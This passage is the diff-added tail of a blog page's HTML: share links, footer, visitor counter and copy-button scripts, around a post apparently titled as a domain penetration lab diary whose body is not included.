+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&title=打靶日记（三）完整的内网域渗透"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&title=打靶日记（三）完整的内网域渗透"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&title=打靶日记（三）完整的内网域渗透"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&title=打靶日记（三）完整的内网域渗透"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&name=打靶日记（三）完整的内网域渗透&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&t=打靶日记（三）完整的内网域渗透"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
